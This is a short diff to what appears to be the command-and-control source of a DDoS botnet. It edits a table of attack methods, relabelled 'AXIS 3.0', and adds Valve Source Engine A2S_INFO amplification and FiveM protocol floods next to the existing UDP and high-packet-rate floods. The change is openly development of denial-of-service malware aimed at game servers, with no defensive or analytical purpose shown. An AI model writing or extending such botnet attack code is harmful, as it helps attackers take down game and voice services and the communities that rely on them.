@@ -51,10 +51,10 @@ var flagInfoLookup = map[string]FlagInfo{
  * Attack method IDs - Must match bot/attack.h
  */
 var attackInfoLookup = map[string]AttackInfo{
-	/* APEX 2.0 L4 Methods */
+	/* AXIS 3.0 L4 Methods */
 	"udp":      {0, []uint8{0, 1, 6, 7, 13}, "UDP flood optimized for Gbps"},
-	"game":     {1, []uint8{0, 1, 6, 7, 13}, "Game/Voice chat flood"},
-	"discord":  {2, []uint8{0, 1, 6, 7, 13}, "Discord voice flood"},
+	"vse":      {1, []uint8{0, 1, 6, 7, 13}, "Valve Source Engine A2S_INFO amplification"},
+	"fivem":    {2, []uint8{0, 1, 6, 7, 13}, "FiveM protocol flood (getinfo/sec/token)"},
 	"pps":      {3, []uint8{6, 7, 13}, "High PPS UDP flood"},
 
 	/* APEX 2.0 L7 Methods */
